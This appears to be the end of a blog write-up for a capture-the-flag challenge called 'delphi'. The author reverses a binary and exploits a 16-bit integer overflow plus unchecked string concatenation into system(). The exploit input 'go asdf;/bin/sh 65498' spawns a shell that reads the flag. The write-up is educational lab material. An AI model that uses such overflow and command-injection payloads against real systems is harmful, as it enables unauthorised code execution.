   <span class="mh">0x0000000000402239</span> <span class="o">&lt;+</span><span class="mi">9</span><span class="o">&gt;:</span>	<span class="k">cmp</span>    <span class="n">rsp</span><span class="p">,</span><span class="n">QWORD</span> <span class="n">PTR</span> <span class="p">[rcx]</span>
   <span class="mh">0x000000000040223c</span> <span class="o">&lt;+</span><span class="mi">12</span><span class="o">&gt;:</span>	<span class="k">ja</span>     <span class="mh">0x402245</span> <span class="o">&lt;</span><span class="n">main</span><span class="p">.</span><span class="n">_Cfunc_check_answer</span><span class="o">+</span><span class="mi">21</span><span class="o">&gt;</span>
   <span class="mh">0x000000000040223e</span> <span class="o">&lt;+</span><span class="mi">14</span><span class="o">&gt;:</span>	<span class="k">call</span>   <span class="mh">0x428280</span> <span class="o">&lt;</span><span class="n">runtime</span><span class="p">.</span><span class="n">morestack16_noctxt</span><span class="o">&gt;</span>
   <span class="mh">0x0000000000402243</span> <span class="o">&lt;+</span><span class="mi">19</span><span class="o">&gt;:</span>	<span class="k">jmp</span>    <span class="mh">0x402230</span> <span class="o">&lt;</span><span class="n">main</span><span class="p">.</span><span class="n">_Cfunc_check_answer</span><span class="o">&gt;</span>
   <span class="mh">0x0000000000402245</span> <span class="o">&lt;+</span><span class="mi">21</span><span class="o">&gt;:</span>	<span class="k">sub</span>    <span class="n">rsp</span><span class="p">,</span><span class="mh">0x10</span>
   <span class="mh">0x0000000000402249</span> <span class="o">&lt;+</span><span class="mi">25</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x400f80</span>
   <span class="mh">0x000000000040224e</span> <span class="o">&lt;+</span><span class="mi">30</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">QWORD</span> <span class="n">PTR</span> <span class="p">[rsp],</span><span class="n">rax</span>
   <span class="mh">0x0000000000402252</span> <span class="o">&lt;+</span><span class="mi">34</span><span class="o">&gt;:</span>	<span class="k">lea</span>    <span class="n">rax</span><span class="p">,</span><span class="err">[</span><span class="n">rsp</span><span class="o">+</span><span class="mh">0x18</span><span class="err">]</span>
   <span class="mh">0x0000000000402257</span> <span class="o">&lt;+</span><span class="mi">39</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">QWORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">rsp</span><span class="o">+</span><span class="mh">0x8</span><span class="err">]</span><span class="p">,</span><span class="n">rax</span>
   <span class="mh">0x000000000040225c</span> <span class="o">&lt;+</span><span class="mi">44</span><span class="o">&gt;:</span>	<span class="k">call</span>   <span class="mh">0x404da0</span> <span class="o">&lt;</span><span class="n">runtime</span><span class="p">.</span><span class="n">cgocall</span><span class="o">&gt;</span>
   <span class="mh">0x0000000000402261</span> <span class="o">&lt;+</span><span class="mi">49</span><span class="o">&gt;:</span>	<span class="k">add</span>    <span class="n">rsp</span><span class="p">,</span><span class="mh">0x10</span>
   <span class="mh">0x0000000000402265</span> <span class="o">&lt;+</span><span class="mi">53</span><span class="o">&gt;:</span>	<span class="k">ret</span>    
   <span class="mh">0x0000000000402266</span> <span class="o">&lt;+</span><span class="mi">54</span><span class="o">&gt;:</span>	<span class="k">add</span>    <span class="n">BYTE</span> <span class="n">PTR</span> <span class="p">[rax],</span><span class="n">al</span>
   <span class="mh">0x0000000000402268</span> <span class="o">&lt;+</span><span class="mi">56</span><span class="o">&gt;:</span>	<span class="k">add</span>    <span class="n">BYTE</span> <span class="n">PTR</span> <span class="p">[rax],</span><span class="n">al</span>
   <span class="mh">0x000000000040226a</span> <span class="o">&lt;+</span><span class="mi">58</span><span class="o">&gt;:</span>	<span class="k">add</span>    <span class="n">BYTE</span> <span class="n">PTR</span> <span class="p">[rax],</span><span class="n">al</span>
   <span class="mh">0x000000000040226c</span> <span class="o">&lt;+</span><span class="mi">60</span><span class="o">&gt;:</span>	<span class="k">add</span>    <span class="n">BYTE</span> <span class="n">PTR</span> <span class="p">[rax],</span><span class="n">al</span>
   <span class="mh">0x000000000040226e</span> <span class="o">&lt;+</span><span class="mi">62</span><span class="o">&gt;:</span>	<span class="k">add</span>    <span class="n">BYTE</span> <span class="n">PTR</span> <span class="p">[rax],</span><span class="n">al</span></code></pre></figure>

<p>Looks like this function calls this function: 0x400f80. I guess we should check that out then:</p>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm">   <span class="mh">0x0000000000400f80</span> <span class="o">&lt;+</span><span class="mi">0</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">rsi</span><span class="p">,</span><span class="n">QWORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">rdi</span><span class="o">+</span><span class="mh">0x8</span><span class="err">]</span>
   <span class="mh">0x0000000000400f84</span> <span class="o">&lt;+</span><span class="mi">4</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">edi</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[rdi]</span>
   <span class="mh">0x0000000000400f86</span> <span class="o">&lt;+</span><span class="mi">6</span><span class="o">&gt;:</span>	<span class="k">jmp</span>    <span class="mh">0x400de0</span> <span class="o">&lt;</span><span class="n">check_answer</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span></code></pre></figure>

<p>Well then, I guess our check_answer function is really apart of that libtwenty.so shared object file since we see our program using the plt to call it.</p>

<p>What is inside this check_answer function?</p>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm">   <span class="p">...</span>
   <span class="mh">0x00007ffff7bd87d7</span> <span class="o">&lt;+</span><span class="mi">127</span><span class="o">&gt;:</span>	<span class="k">call</span>   <span class="mh">0x7ffff7bd8650</span> <span class="o">&lt;</span><span class="n">strcat</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
   <span class="mh">0x00007ffff7bd87dc</span> <span class="o">&lt;+</span><span class="mi">132</span><span class="o">&gt;:</span>	<span class="k">lea</span>    <span class="n">rax</span><span class="p">,</span><span class="err">[</span><span class="n">rbp</span><span class="o">-</span><span class="mh">0x90</span><span class="err">]</span>
   <span class="mh">0x00007ffff7bd87e3</span> <span class="o">&lt;+</span><span class="mi">139</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">rdi</span><span class="p">,</span><span class="n">rax</span>
   <span class="mh">0x00007ffff7bd87e6</span> <span class="o">&lt;+</span><span class="mi">142</span><span class="o">&gt;:</span>	<span class="k">call</span>   <span class="mh">0x7ffff7bd8630</span> <span class="o">&lt;</span><span class="n">system</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
   <span class="p">...</span></code></pre></figure>

<p>Ooo, a strcat and system call as well as no input validation… interesting… let’s try to see if we can get there:</p>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm">   <span class="p">...</span>
   <span class="mh">0x00007ffff7bd8770</span> <span class="o">&lt;+</span><span class="mi">24</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">WORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">rbp</span><span class="o">-</span><span class="mh">0x2</span><span class="err">]</span><span class="p">,</span><span class="mh">0x2a</span>           <span class="c">; Move 42 into rbp-0x2 (let's call this var1)</span>
   <span class="mh">0x00007ffff7bd8776</span> <span class="o">&lt;+</span><span class="mi">30</span><span class="o">&gt;:</span>	<span class="k">lea</span>    <span class="n">rax</span><span class="p">,</span><span class="err">[</span><span class="n">rbp</span><span class="o">-</span><span class="mh">0x90</span><span class="err">]</span>                    <span class="c">; Load the address rbp-0x90 into rax</span>
   <span class="mh">0x00007ffff7bd877d</span> <span class="o">&lt;+</span><span class="mi">37</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[rax],</span><span class="mh">0x6f686365</span>        <span class="c">; Put "echo" at rax</span>
   <span class="mh">0x00007ffff7bd8783</span> <span class="o">&lt;+</span><span class="mi">43</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">WORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">rax</span><span class="o">+</span><span class="mh">0x4</span><span class="err">]</span><span class="p">,</span><span class="mh">0x20</span>           <span class="c">; Put 32 at rax+4</span>
   <span class="mh">0x00007ffff7bd8789</span> <span class="o">&lt;+</span><span class="mi">49</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">rbp</span><span class="o">-</span><span class="mh">0x94</span><span class="err">]</span>          <span class="c">; Put our parsed second parameter into eax (found this out with a little more reversing)</span>
   <span class="mh">0x00007ffff7bd878f</span> <span class="o">&lt;+</span><span class="mi">55</span><span class="o">&gt;:</span>	<span class="k">add</span>    <span class="n">WORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">rbp</span><span class="o">-</span><span class="mh">0x2</span><span class="err">]</span><span class="p">,</span><span class="n">ax</span>             <span class="c">; Add rbp-0x2 (assigned to be 42) and our number and put back into rbp-0x2</span>
   <span class="mh">0x00007ffff7bd8793</span> <span class="o">&lt;+</span><span class="mi">59</span><span class="o">&gt;:</span>	<span class="k">movzx</span>  <span class="n">eax</span><span class="p">,</span><span class="n">WORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">rbp</span><span class="o">-</span><span class="mh">0x2</span><span class="err">]</span>            <span class="c">; Put rbp-0x2 into eax</span>
   <span class="mh">0x00007ffff7bd8797</span> <span class="o">&lt;+</span><span class="mi">63</span><span class="o">&gt;:</span>	<span class="k">cmp</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x4</span>                           <span class="c">; Compare our sum of input + 42 to 4</span>
   <span class="mh">0x00007ffff7bd879a</span> <span class="o">&lt;+</span><span class="mi">66</span><span class="o">&gt;:</span>	<span class="k">ja</span>     <span class="mh">0x7ffff7bd87ed</span> <span class="o">&lt;</span><span class="n">check_answer</span><span class="o">+</span><span class="mi">149</span><span class="o">&gt;</span> <span class="c">; If the sum is above 4, then exit check_answer</span>
   <span class="p">...</span></code></pre></figure>

<p>So here is where our control flow can take either the red or blue pill and we want the “ja” to fail so we don’t end up at the end of the function, but instead in this interesting piece of code:</p>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm">   <span class="p">...</span>
   <span class="mh">0x00007ffff7bd879c</span> <span class="o">&lt;+</span><span class="mi">68</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">eax</span>
   <span class="mh">0x00007ffff7bd879e</span> <span class="o">&lt;+</span><span class="mi">70</span><span class="o">&gt;:</span>	<span class="k">lea</span>    <span class="n">rdx</span><span class="p">,</span><span class="err">[</span><span class="n">rax</span><span class="o">*</span><span class="mi">4</span><span class="o">+</span><span class="mh">0x0</span><span class="err">]</span>
   <span class="mh">0x00007ffff7bd87a6</span> <span class="o">&lt;+</span><span class="mi">78</span><span class="o">&gt;:</span>	<span class="k">lea</span>    <span class="n">rax</span><span class="p">,</span><span class="err">[</span><span class="n">rip</span><span class="o">+</span><span class="mh">0xff</span><span class="err">]</span>        <span class="err">#</span> <span class="mh">0x7ffff7bd88ac</span>
   <span class="mh">0x00007ffff7bd87ad</span> <span class="o">&lt;+</span><span class="mi">85</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">rdx</span><span class="o">+</span><span class="n">rax</span><span class="o">*</span><span class="mi">1</span><span class="err">]</span>
   <span class="mh">0x00007ffff7bd87b0</span> <span class="o">&lt;+</span><span class="mi">88</span><span class="o">&gt;:</span>	<span class="k">movsxd</span> <span class="n">rdx</span><span class="p">,</span><span class="n">eax</span>
   <span class="mh">0x00007ffff7bd87b3</span> <span class="o">&lt;+</span><span class="mi">91</span><span class="o">&gt;:</span>	<span class="k">lea</span>    <span class="n">rax</span><span class="p">,</span><span class="err">[</span><span class="n">rip</span><span class="o">+</span><span class="mh">0xf2</span><span class="err">]</span>        <span class="err">#</span> <span class="mh">0x7ffff7bd88ac</span>
   <span class="mh">0x00007ffff7bd87ba</span> <span class="o">&lt;+</span><span class="mi">98</span><span class="o">&gt;:</span>	<span class="k">add</span>    <span class="n">rax</span><span class="p">,</span><span class="n">rdx</span>
   <span class="mh">0x00007ffff7bd87bd</span> <span class="o">&lt;+</span><span class="mi">101</span><span class="o">&gt;:</span>	<span class="k">jmp</span>    <span class="n">rax</span>
   <span class="p">...</span></code></pre></figure>

<p>Which does some calculation stuff and then jumps to rax. OK, so in our comparison code we take 42 and add it to our second parameter. At this point we can guess our payload will look something like this:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">go &lt;something&gt; &lt;number&gt;</code></pre></figure>

<p>So if we start with 42 and add the number we specified, how can we get that to be less than or equal to 4? Hmmm… well an integer overflow would sure do the trick :D This assembly actually looks really funky, like why would you use the ax register and add it to WORD [rbp-0x2] and compare 4 to the WORD [rbp-0x2]? Since a WORD is only two bytes, if we send in the maximum value of a WORD and add it to any value, the carry bit is going to be discarded because we will have exceeded the size of a WORD. So what if we send the largest size of a WORD - 42 == 2^16 - 42 == 65494?</p>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="err">[</span><span class="o">----------------------------------</span><span class="n">registers</span><span class="o">-----------------------------------</span><span class="err">]</span>
<span class="n">RAX</span><span class="o">:</span> <span class="mh">0x0</span> 
<span class="err">[</span><span class="o">-------------------------------------</span><span class="n">code</span><span class="o">-------------------------------------</span><span class="err">]</span>
   <span class="mh">0x7ffff7bd8789</span> <span class="o">&lt;</span><span class="n">check_answer</span><span class="o">+</span><span class="mi">49</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">rbp</span><span class="o">-</span><span class="mh">0x94</span><span class="err">]</span>
   <span class="mh">0x7ffff7bd878f</span> <span class="o">&lt;</span><span class="n">check_answer</span><span class="o">+</span><span class="mi">55</span><span class="o">&gt;:</span>	<span class="k">add</span>    <span class="n">WORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">rbp</span><span class="o">-</span><span class="mh">0x2</span><span class="err">]</span><span class="p">,</span><span class="n">ax</span>
   <span class="mh">0x7ffff7bd8793</span> <span class="o">&lt;</span><span class="n">check_answer</span><span class="o">+</span><span class="mi">59</span><span class="o">&gt;:</span>	<span class="k">movzx</span>  <span class="n">eax</span><span class="p">,</span><span class="n">WORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">rbp</span><span class="o">-</span><span class="mh">0x2</span><span class="err">]</span>
<span class="o">=&gt;</span> <span class="mh">0x7ffff7bd8797</span> <span class="o">&lt;</span><span class="n">check_answer</span><span class="o">+</span><span class="mi">63</span><span class="o">&gt;:</span>	<span class="k">cmp</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x4</span>
   <span class="mh">0x7ffff7bd879a</span> <span class="o">&lt;</span><span class="n">check_answer</span><span class="o">+</span><span class="mi">66</span><span class="o">&gt;:</span>	<span class="k">ja</span>     <span class="mh">0x7ffff7bd87ed</span> <span class="o">&lt;</span><span class="n">check_answer</span><span class="o">+</span><span class="mi">149</span><span class="o">&gt;</span>
   <span class="mh">0x7ffff7bd879c</span> <span class="o">&lt;</span><span class="n">check_answer</span><span class="o">+</span><span class="mi">68</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">eax</span>
   <span class="mh">0x7ffff7bd879e</span> <span class="o">&lt;</span><span class="n">check_answer</span><span class="o">+</span><span class="mi">70</span><span class="o">&gt;:</span>	<span class="k">lea</span>    <span class="n">rdx</span><span class="p">,</span><span class="err">[</span><span class="n">rax</span><span class="o">*</span><span class="mi">4</span><span class="o">+</span><span class="mh">0x0</span><span class="err">]</span>
   <span class="mh">0x7ffff7bd87a6</span> <span class="o">&lt;</span><span class="n">check_answer</span><span class="o">+</span><span class="mi">78</span><span class="o">&gt;:</span>	<span class="k">lea</span>    <span class="n">rax</span><span class="p">,</span><span class="err">[</span><span class="n">rip</span><span class="o">+</span><span class="mh">0xff</span><span class="err">]</span>        <span class="err">#</span> <span class="mh">0x7ffff7bd88ac</span></code></pre></figure>

<p>Woah, eax is 0! So now we are going to hit that weird jump code. Now the question is, what does eax have to be to get the system code to be called? Well we could do the math here, or since we know eax can only be 0, 1, 2 or 4 we could just try setting eax to be those different numbers until we get it to work :D</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">➜  yvr  ./delphi 
Welcome!

Are you ready to play 20 questions? No? Perfect!
Im thinking of something big, metal, and orange. Go!
<span class="o">&gt;</span> go asdf 65494    <span class="c"># 2^16 - 42 + 0 == 65494 means eax = 0</span>
<span class="o">&gt;</span> go asdf 65495    <span class="c"># 2^16 - 42 + 1 == 65495 means eax = 1</span>
<span class="o">&gt;</span> go asdf 65496    <span class="c"># 2^16 - 42 + 2 == 65496 means eax = 2</span>
<span class="o">&gt;</span> go asdf 65497    <span class="c"># 2^16 - 42 + 3 == 65497 means eax = 3</span>
<span class="o">&gt;</span> go asdf 65498    <span class="c"># 2^16 - 42 + 4 == 65498 means eax = 4</span>
asdf
<span class="o">&gt;</span> </code></pre></figure>

<p>Boom! So we got that system call to be executed and all it does right now is “echo <our string="">". But if you look at the code again, it simply concatinates the 2nd part of our payload to the echo without checking for special characters, meaning we can just put a semicolon and execute arbituary commands :D</our></p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">➜  yvr  ./delphi
Welcome!

Are you ready to play 20 questions? No? Perfect!
Im thinking of something big, metal, and orange. Go!
<span class="o">&gt;</span> go asdf<span class="p">;</span>/bin/sh 65498
asdf
<span class="nv">$ </span><span class="nb">cat </span>flag.txt
flag<span class="o">{</span>something or other<span class="o">}</span>  <span class="c"># Not the actual flag, running locally</span>
<span class="nv">$ </span></code></pre></figure>

<p>Not too bad of a challenge, really was more reversing than actually exploitation. So when it all boils down, you have to reverse a basic command protocol, exploit an integer overflow and use metacharacter injection. For 200 points I would say that is reasonable :D</p>

  </div>

</article>

        </div>
      </div>

      <footer class="site-footer">
  <div class="wrapper">
    <div class="footer-col-wrapper">
      <div class="footer-col footer-col-1">
        <div class="social-media-list">
          
            <a href="mailto:chris@vgcs.io">Email</a>
          

          
            <a href="https://github.com/breadchris">Github</a>
          

          
            <a href="https://twitter.com/breadchris">Twitter</a>
          
        </div>
      </div>

      <div class="footer-col footer-col-2">
        <p>Theme made by <a href="http://masha.space/">Masha Safina</a>. Codes available on <a href="https://github.com/mashlo/captains-log">GitHub</a> 🖖</p>
      </div>
    </div>
  </div>
</footer>

    </div>
  </body>

</html>
